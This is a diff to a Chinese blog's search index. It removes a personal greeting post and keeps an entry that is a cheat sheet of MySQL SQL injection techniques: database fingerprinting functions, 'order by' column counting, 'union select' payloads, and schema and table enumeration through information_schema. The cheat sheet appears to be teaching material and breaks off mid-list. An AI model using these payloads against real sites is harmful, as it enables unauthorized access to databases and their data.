@@ -1,11 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[给夹夹的话]]></title>
-    <url>%2F2019%2F08%2F26%2F%E7%95%99%E8%A8%80%2F</url>
-    <content type="text"><![CDATA[​ 23333欢迎夹夹！！！！！ ​ 话说你出羁儿了吗！！？]]></content>
-  </entry>
-  <entry>
     <title><![CDATA[sql注入常用合集]]></title>
     <url>%2F2019%2F08%2F26%2Fsql%E6%B3%A8%E5%85%A5%E5%90%88%E9%9B%86%2F</url>
     <content type="text"><![CDATA[Mysql常用命令基本词 Mysql版本version() 当前用户名user() 数据库名database() 数据库路径@@datadir 操作系统版本@@version_compile_os Mysql的安装路径@@basedir Union注入 Mysql要大于5.0 找到注入点后获取字段数 1order by Num 查看字段回显 1id=-1 union select 1,2....,n 获取系统数据库名 1select null,null,schema_name from information_schema.schemata 直接获取当前数据库名 1select null,null...,database() 获取数据库中的表 1select null,null,...,group_concat(table_name) from information_schama.tables where table_schema=database()]]></content>
